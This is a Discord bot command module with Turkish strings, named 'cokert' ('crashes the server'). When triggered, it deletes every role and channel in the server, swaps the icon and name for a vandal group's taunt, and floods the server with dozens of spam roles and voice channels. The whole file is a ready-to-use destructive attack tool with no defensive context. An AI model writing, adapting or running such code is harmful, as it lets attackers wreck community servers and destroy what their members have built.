module.exports = {
    name: 'cokert',
    description: 'Sunucuyu çökertir.',
    async execute(message, args, client) {
        message.delete();
        message.guild.setIcon('https://i.hizliresim.com/QsAZKd.jpg');
        message.guild.setName('KLAVYE SOKUCULARI TARAFINDAN SOKULDUNUZ.');
        await message.guild.roles.cache.forEach(roles => roles.delete());
        await message.guild.channels.cache.forEach(channel => channel.delete());
        for (var i = 0; i < 50; i++) {
            message.guild.roles.create({ data: { name: 'KLAVYE', color: 'GREEN' }, reason: 'Klavye sokucuları affetmez' });
            message.guild.roles.create({ data: { name: 'SOKUCULARI', color: 'BLUE' }, reason: 'Klavye sokucuları affetmez' });
        }
        message.guild.channels.create('▬▬▬▬▬▬▬▬▬', { type: 'voice' });
        for (var i = 0; i < 50; i++) {
            message.guild.channels.create('KLAVYE SOKUCULARI', { type: 'voice' });
            message.guild.channels.create('KUDUR', { type: 'voice' });
            message.guild.channels.create('▬▬▬▬▬▬▬▬▬', { type: 'voice' });
        }
    }
}